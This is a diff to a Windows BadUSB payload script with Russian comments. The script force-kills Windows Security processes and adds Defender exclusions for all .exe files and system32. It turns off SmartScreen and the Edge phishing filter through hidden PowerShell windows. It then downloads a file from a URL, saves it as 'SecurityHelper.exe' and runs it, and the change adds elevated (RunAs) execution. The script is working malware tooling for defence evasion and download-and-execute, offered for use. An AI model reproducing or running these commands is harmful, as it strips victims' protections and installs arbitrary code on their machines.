@@ -10,7 +10,7 @@ taskkill /f /im SecurityHealthHost.exe
 taskkill /f /im RuntimeBroker.exe
 taskkill /f /im SecHealthUI.exe
 taskkill /f /im MicrosoftSecurityApp.exe
-ping 127.0.0.1 -n 1 -w 500 > nul
+timeout /t 1
 taskkill /f /im SecurityHealthSystray.exe
 taskkill /f /im SecurityHealthService.exe
 taskkill /f /im SecurityHealthHost.exe
@@ -19,10 +19,11 @@ taskkill /f /im RuntimeBroker.exe
 taskkill /f /im SecHealthUI.exe
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v .exe /t REG_SZ /d "Значение_параметра" /reg:64
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v system32 /t REG_SZ /d "Значение_параметра" /reg:64
+timeout /t 1
 PowerShell.exe -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Type DWord -Value 0"
 PowerShell.exe -WindowStyle Hidden -Command "If (!(Test-Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter')) {New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter' -Force | Out-Null}"
 PowerShell.exe -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter' -Name 'EnabledV9' -Type DWord -Value 0"
-
+timeout /t 1
 # Payload 1 для BadUSB
 # Задача: Скачать и запустить любой файл (хоть EXE, хоть MP3)
 # Этот файл нагрузки будет выполняться в фоновом режиме без видимых окон, и его размер может быть любым (в нём нет лимита на 259 символов)
@@ -35,5 +36,5 @@ $tempFolder = New-Item -ItemType Directory -Path $env:TEMP -Name "MyTempFolder" 
 # Генерация пути к временному файлу внутри временной папки
 $file = Join-Path $tempFolder.FullName "SecurityHelper.exe"
 
-PowerShell (New-Object System.Net.WebClient).DownloadFile($url_file, $file), # Запуск PowerShell с передачей ему строки для скачивания файла
-(New-Object -com Shell.Application).ShellExecute($file);  # Строчка для запуска файла, который мы скачали
+Start-Process powershell -ArgumentList "(New-Object System.Net.WebClient).DownloadFile($url_file, $file), # Запуск PowerShell с передачей ему строки для скачивания файла
+(New-Object -com Shell.Application).ShellExecute($file) -Verb RunAs";  # Строчка для запуска файла, который мы скачали
